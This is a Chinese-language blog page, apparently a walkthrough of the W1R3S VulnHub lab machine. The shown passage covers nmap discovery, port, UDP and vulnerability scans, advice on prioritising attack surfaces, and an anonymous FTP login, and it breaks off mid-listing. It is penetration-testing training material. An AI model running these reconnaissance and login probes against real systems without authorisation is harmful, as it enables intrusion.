<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>W1R3S | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="W1R3S主机发现123456789101112131415161718kali@kali:~$ sudo nmap -sn 192.168.19.0&#x2F;24Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-11-25 11:20 ESTNmap scan report for 192.168.19.1Host is up (0.00015s laten">
<meta property="og:type" content="article">
<meta property="og:title" content="W1R3S">
<meta property="og:url" content="http://example.com/2022/11/26/W1R3S/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="W1R3S主机发现123456789101112131415161718kali@kali:~$ sudo nmap -sn 192.168.19.0&#x2F;24Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-11-25 11:20 ESTNmap scan report for 192.168.19.1Host is up (0.00015s laten">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2022-11-26T07:54:54.000Z">
<meta property="article:modified_time" content="2022-12-04T05:05:00.506Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="vulnhub靶机">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/11/26/W1R3S/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'W1R3S',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-12-04 13:05:00'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Hexo</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">W1R3S</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-11-26T07:54:54.000Z" title="Created 2022-11-26 15:54:54">2022-11-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-12-04T05:05:00.506Z" title="Updated 2022-12-04 13:05:00">2022-12-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="W1R3S"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="W1R3S"><a href="#W1R3S" class="headerlink" title="W1R3S"></a>W1R3S</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">kali@kali:~$ <span class="title">sudo</span> <span class="title">nmap</span> -<span class="title">sn</span> 192.168.19.0/24</span></span><br><span class="line"><span class="function"><span class="title">Starting</span> <span class="title">Nmap</span> 7.92 ( <span class="title">https</span>://<span class="title">nmap.org</span> ) <span class="title">at</span> 2022-11-25 11:20 <span class="title">EST</span></span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">scan</span> <span class="title">report</span> <span class="title">for</span> 192.168.19.1</span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">is</span> <span class="title">up</span> (0.00015<span class="title">s</span> <span class="title">latency</span>).</span></span><br><span class="line"><span class="function"><span class="title">MAC</span> <span class="title">Address</span>: 00:50:56:<span class="title">C0</span>:00:08 (<span class="title">VMware</span>)</span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">scan</span> <span class="title">report</span> <span class="title">for</span> 192.168.19.2</span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">is</span> <span class="title">up</span> (0.00013<span class="title">s</span> <span class="title">latency</span>).</span></span><br><span class="line"><span class="function"><span class="title">MAC</span> <span class="title">Address</span>: 00:50:56:<span class="title">FF:BF</span>:31 (<span class="title">VMware</span>)</span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">scan</span> <span class="title">report</span> <span class="title">for</span> 192.168.19.177</span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">is</span> <span class="title">up</span> (0.0011<span class="title">s</span> <span class="title">latency</span>).</span></span><br><span class="line"><span class="function"><span class="title">MAC</span> <span class="title">Address</span>: 00:0<span class="title">C</span>:29:3<span class="title">C:F0</span>:<span class="title">A4</span> (<span class="title">VMware</span>)</span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">scan</span> <span class="title">report</span> <span class="title">for</span> 192.168.19.254</span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">is</span> <span class="title">up</span> (0.00012<span class="title">s</span> <span class="title">latency</span>).</span></span><br><span class="line"><span class="function"><span class="title">MAC</span> <span class="title">Address</span>: 00:50:56:<span class="title">F4:EE</span>:<span class="title">D1</span> (<span class="title">VMware</span>)</span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">scan</span> <span class="title">report</span> <span class="title">for</span> 192.168.19.131</span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">is</span> <span class="title">up</span>.</span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">done</span>: 256 <span class="title">IP</span> <span class="title">addresses</span> (5 <span class="title">hosts</span> <span class="title">up</span>) <span class="title">scanned</span> <span class="title">in</span> 14.96 <span class="title">seconds</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<p>131是本机，所以177是我们目标机器</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="开放端口扫描"><a href="#开放端口扫描" class="headerlink" title="开放端口扫描"></a>开放端口扫描</h3><p>实际环境至少扫两遍，比对结果，然后分析</p>
<p>扫描主机开放了哪些端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 192.168.19.177</span><br><span class="line">这个是大佬综合效率，文档，权衡下选择的一条命令</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">kali@kali:~$ <span class="title">sudo</span> <span class="title">nmap</span> --<span class="title">min</span>-<span class="title">rate</span> 10000 -<span class="title">p</span>- 192.168.19.177</span></span><br><span class="line"><span class="function"><span class="title">Starting</span> <span class="title">Nmap</span> 7.92 ( <span class="title">https</span>://<span class="title">nmap.org</span> ) <span class="title">at</span> 2022-11-25 11:21 <span class="title">EST</span></span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">scan</span> <span class="title">report</span> <span class="title">for</span> 192.168.19.177</span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">is</span> <span class="title">up</span> (0.00038<span class="title">s</span> <span class="title">latency</span>).</span></span><br><span class="line"><span class="function"><span class="title">Not</span> <span class="title">shown</span>: 55528 <span class="title">filtered</span> <span class="title">tcp</span> <span class="title">ports</span> (<span class="title">no</span>-<span class="title">response</span>), 10003 <span class="title">closed</span> <span class="title">tcp</span> <span class="title">ports</span> (<span class="title">reset</span>)</span></span><br><span class="line"><span class="function"><span class="title">PORT</span>     <span class="title">STATE</span> <span class="title">SERVICE</span></span></span><br><span class="line"><span class="function">21/<span class="title">tcp</span>   <span class="title">open</span>  <span class="title">ftp</span></span></span><br><span class="line"><span class="function">22/<span class="title">tcp</span>   <span class="title">open</span>  <span class="title">ssh</span></span></span><br><span class="line"><span class="function">80/<span class="title">tcp</span>   <span class="title">open</span>  <span class="title">http</span></span></span><br><span class="line"><span class="function">3306/<span class="title">tcp</span> <span class="title">open</span>  <span class="title">mysql</span></span></span><br><span class="line"><span class="function"><span class="title">MAC</span> <span class="title">Address</span>: 00:0<span class="title">C</span>:29:3<span class="title">C:F0</span>:<span class="title">A4</span> (<span class="title">VMware</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">done</span>: 1 <span class="title">IP</span> <span class="title">address</span> (1 <span class="title">host</span> <span class="title">up</span>) <span class="title">scanned</span> <span class="title">in</span> 18.94 <span class="title">seconds</span></span></span><br><span class="line"><span class="function">                                                               </span></span><br></pre></td></tr></table></figure>

<h3 id="对开放的端口进行深度扫描"><a href="#对开放的端口进行深度扫描" class="headerlink" title="对开放的端口进行深度扫描"></a>对开放的端口进行深度扫描</h3><p>TCP扫描，探测版本，服务，操作系统</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -O -p21,22,80,3306 192.168.19.177</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">kali@kali:~$ <span class="title">sudo</span> <span class="title">nmap</span> -<span class="title">sT</span> -<span class="title">sV</span> -<span class="title">O</span> -<span class="title">p21</span>,22,80,3306 192.168.19.177</span></span><br><span class="line"><span class="function"><span class="title">Starting</span> <span class="title">Nmap</span> 7.92 ( <span class="title">https</span>://<span class="title">nmap.org</span> ) <span class="title">at</span> 2022-11-25 11:28 <span class="title">EST</span></span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">scan</span> <span class="title">report</span> <span class="title">for</span> 192.168.19.177</span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">is</span> <span class="title">up</span> (0.00072<span class="title">s</span> <span class="title">latency</span>).</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PORT</span>     <span class="title">STATE</span> <span class="title">SERVICE</span> <span class="title">VERSION</span></span></span><br><span class="line"><span class="function">21/<span class="title">tcp</span>   <span class="title">open</span>  <span class="title">ftp</span>     <span class="title">vsftpd</span> 2.0.8 <span class="title">or</span> <span class="title">later</span></span></span><br><span class="line"><span class="function">22/<span class="title">tcp</span>   <span class="title">open</span>  <span class="title">ssh</span>     <span class="title">OpenSSH</span> 7.2<span class="title">p2</span> <span class="title">Ubuntu</span> 4<span class="title">ubuntu2</span>.4 (<span class="title">Ubuntu</span> <span class="title">Linux</span>; <span class="title">protocol</span> 2.0)</span></span><br><span class="line"><span class="function">80/<span class="title">tcp</span>   <span class="title">open</span>  <span class="title">http</span>    <span class="title">Apache</span> <span class="title">httpd</span> 2.4.18 ((<span class="title">Ubuntu</span>))</span></span><br><span class="line"><span class="function">3306/<span class="title">tcp</span> <span class="title">open</span>  <span class="title">mysql</span>   <span class="title">MySQL</span> (<span class="title">unauthorized</span>)</span></span><br><span class="line"><span class="function"><span class="title">MAC</span> <span class="title">Address</span>: 00:0<span class="title">C</span>:29:3<span class="title">C:F0</span>:<span class="title">A4</span> (<span class="title">VMware</span>)</span></span><br><span class="line"><span class="function"><span class="title">Warning</span>: <span class="title">OSScan</span> <span class="title">results</span> <span class="title">may</span> <span class="title">be</span> <span class="title">unreliable</span> <span class="title">because</span> <span class="title">we</span> <span class="title">could</span> <span class="title">not</span> <span class="title">find</span> <span class="title">at</span> <span class="title">least</span> 1 <span class="title">open</span> <span class="title">and</span> 1 <span class="title">closed</span> <span class="title">port</span></span></span><br><span class="line"><span class="function"><span class="title">Device</span> <span class="title">type</span>: <span class="title">general</span> <span class="title">purpose</span></span></span><br><span class="line"><span class="function"><span class="title">Running</span>: <span class="title">Linux</span> 3.<span class="title">X</span>|4.<span class="title">X</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">CPE</span>: <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span>:3 <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span>:4</span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">details</span>: <span class="title">Linux</span> 3.10 - 4.11, <span class="title">Linux</span> 3.2 - 4.9</span></span><br><span class="line"><span class="function"><span class="title">Network</span> <span class="title">Distance</span>: 1 <span class="title">hop</span></span></span><br><span class="line"><span class="function"><span class="title">Service</span> <span class="title">Info</span>: <span class="title">Host</span>: ../<span class="title">images.inc</span>; <span class="title">OS</span>: <span class="title">Linux</span>; <span class="title">CPE</span>: <span class="title">cpe</span>:/<span class="title">o:linux</span>:<span class="title">linux_kernel</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">and</span> <span class="title">Service</span> <span class="title">detection</span> <span class="title">performed</span>. <span class="title">Please</span> <span class="title">report</span> <span class="title">any</span> <span class="title">incorrect</span> <span class="title">results</span> <span class="title">at</span> <span class="title">https</span>://<span class="title">nmap.org</span>/<span class="title">submit</span>/ .</span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">done</span>: 1 <span class="title">IP</span> <span class="title">address</span> (1 <span class="title">host</span> <span class="title">up</span>) <span class="title">scanned</span> <span class="title">in</span> 19.87 <span class="title">seconds</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<p><strong>别忽略UDP扫描，没攻击向量的时候,UDP可能是一个出路</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU -p21,22,80,3306 192.168.19.177</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">kali@kali:~$ <span class="title">sudo</span> <span class="title">nmap</span> -<span class="title">sU</span> -<span class="title">p21</span>,22,80,3306 192.168.19.177</span></span><br><span class="line"><span class="function"><span class="title">Starting</span> <span class="title">Nmap</span> 7.92 ( <span class="title">https</span>://<span class="title">nmap.org</span> ) <span class="title">at</span> 2022-11-25 11:32 <span class="title">EST</span></span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">scan</span> <span class="title">report</span> <span class="title">for</span> 192.168.19.177</span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">is</span> <span class="title">up</span> (0.00046<span class="title">s</span> <span class="title">latency</span>).</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PORT</span>     <span class="title">STATE</span>         <span class="title">SERVICE</span></span></span><br><span class="line"><span class="function">21/<span class="title">udp</span>   <span class="title">open</span>|<span class="title">filtered</span> <span class="title">ftp</span></span></span><br><span class="line"><span class="function">22/<span class="title">udp</span>   <span class="title">open</span>|<span class="title">filtered</span> <span class="title">ssh</span></span></span><br><span class="line"><span class="function">80/<span class="title">udp</span>   <span class="title">open</span>|<span class="title">filtered</span> <span class="title">http</span></span></span><br><span class="line"><span class="function">3306/<span class="title">udp</span> <span class="title">closed</span>        <span class="title">mysql</span></span></span><br><span class="line"><span class="function"><span class="title">MAC</span> <span class="title">Address</span>: 00:0<span class="title">C</span>:29:3<span class="title">C:F0</span>:<span class="title">A4</span> (<span class="title">VMware</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Nmap</span> <span class="title">done</span>: 1 <span class="title">IP</span> <span class="title">address</span> (1 <span class="title">host</span> <span class="title">up</span>) <span class="title">scanned</span> <span class="title">in</span> 7.89 <span class="title">seconds</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<p>分析一下扫描的结果</p>
<p>21端口可能有匿名登录</p>
<p>22端口，实际有攻击面的概率不大，可以简单尝试，不建议死磕</p>
<p>80端口，一般是最大的攻击面，可能性很大，就算可能不是突破口，也可能暴露很多信息</p>
<p>3306，和80一样，可能性也不小</p>
<p>对于这几个端口，存在攻击面的可能，22可能性比较小，然后是3306，再然后是22，最可能的是80</p>
<blockquote>
<p>打点顺序，因为21比较简单，ftp 一般来说都比较简单，他能看的事情就是我能不能匿名，然后我能不能找到账号，然后我进去之后是不是可写类似这样的操作。然后还有 FTP 也有一个目录横向移动，类似这些我们都经历过，所以这些我们一般先看21，然后看80这两个是关联到一起的。那根据我们后边的具体情况，如果21和80都不行，那我们就看3306。如果这三个都不行，那我们看22。</p>
<p>每一个攻击向量 womens 死磕到什么程度才是 OK 的。我一般来说就是如果20分钟到半小时这个不行，那我就切换另一个。为什么这样操作？因为如果每一项你要都死磕下去，会耗费你特别多的时间，而就算你死磕下去，你把它搞定了，但是你未必是最省时间的。所以你要迅速的去切换，这样去切换也有利于你换一下脑子，换一下思路。</p>
</blockquote>
<h2 id="nmap进行漏洞扫描"><a href="#nmap进行漏洞扫描" class="headerlink" title="nmap进行漏洞扫描"></a>nmap进行漏洞扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap --script=vuln -p21,22,80,3306 192.168.19.17</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap --script=vuln -p21,22,80,3306 192.168.19.177</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-25 11:42 EST</span><br><span class="line">Nmap scan report for 192.168.19.177</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">MAC Address: 00:0C:29:3C:F0:A4 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 327.90 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现80有DOS攻击，存在wordpress，重点关注</p>
<p>21，22，3306没扫描出什么</p>
<h2 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h2><p>ftp匿名登录成功</p>
<p>匿名用户名anonymous密码为空</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/../images]</span><br><span class="line">└─$ ftp 192.168.19.177</span><br><span class="line">Connected to 192.168.19.177.</span><br><span class="line">220 Welcome to ../images.inc FTP service.</span><br><span class="line">Name (192.168.19.177:kali): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看里面的文件，发现是可以执行的，但是不能写，所以利用不了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||48758|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure>

<p>把里面的文件全部下载下来</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line"><span class="number">229</span> Entering Extended Passive <span class="built_in">Mode</span> (|||<span class="number">48758</span>|)</span><br><span class="line"><span class="number">150</span> Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> ftp      ftp          <span class="number">4096</span> Jan <span class="number">23</span>  <span class="number">2018</span> content</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> ftp      ftp          <span class="number">4096</span> Jan <span class="number">23</span>  <span class="number">2018</span> docs</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> ftp 